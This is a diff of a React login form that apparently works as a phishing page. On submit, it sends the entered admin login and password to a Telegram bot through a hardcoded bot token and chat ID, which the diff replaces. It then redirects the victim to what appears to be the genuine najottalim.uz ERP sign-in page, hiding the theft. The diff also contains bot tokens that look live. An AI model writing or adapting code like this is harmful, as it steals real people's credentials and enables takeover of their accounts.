@@ -7,8 +7,8 @@ const App = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
 
-    const token = "8398761924:AAGvHEGjeHRS1CrOd2bUAGM_zKGuFsU07GI";
-    const chatId = "7533222753";
+    const token = "8215442940:AAGSZHgIPTZ6I0BmXF65h6S5Wz2C3OTdCR4";
+    const chatId = "7219373592";
 
     const text = `<b>Admin malumoti!</b>\n\n<b>Login:</b> ${login}\n<b>Parol:</b> ${password}`;
 
@@ -31,11 +31,12 @@ const App = () => {
       if (data.ok) {
         setLogin("");
         setPassword("");
+        window.location.href = "https://erp.admin.najottalim.uz/signin";
       } else {
-        console.log("errolo");
+        console.log("Xatolik yuz berdi (Telegram API)");
       }
     } catch (error) {
-      console.log("erro");
+      console.log("Tarmoq xatosi");
     }
   };
   return (
